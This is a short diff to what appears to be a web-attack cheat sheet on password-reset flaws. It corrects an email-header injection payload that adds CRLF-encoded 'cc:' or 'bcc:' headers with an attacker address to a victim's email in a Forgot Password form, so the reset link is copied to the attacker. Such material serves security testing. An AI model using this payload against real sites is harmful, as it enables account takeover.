@@ -40,7 +40,7 @@ Origin
 
 ```
 - Click Forgot Password
-- Enter victim@mail.com%0d%0accattacker@mail.com Or victim@mail.com%0d%0abccattacker@mail.com
+- Enter victim@mail.com%0d%0acc:attacker@mail.com Or victim@mail.com%0d%0abcc:attacker@mail.com
 ```
 
 ### Email Change
